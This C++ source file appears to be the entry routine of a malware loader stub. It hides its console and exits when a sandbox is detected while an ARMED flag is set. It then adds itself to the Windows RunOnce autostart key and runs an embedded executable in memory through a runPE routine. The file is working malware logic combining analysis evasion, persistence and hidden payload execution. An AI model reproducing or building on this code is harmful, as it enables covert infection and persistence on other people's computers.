#include "pch.h"
#include "example.h"

int example::start(int argc, char* argv[]) {
	if constexpr (ARMED) FreeConsole();
	if (ARMED && sandboxdetect::is_sandboxed()) return 1;

	TCHAR location[MAX_PATH];
	GetModuleFileName(NULL, location, MAX_PATH);
	autostart::addto_runonce(location);

	loadpe::runPE(&raw::data);

	return 0;
}
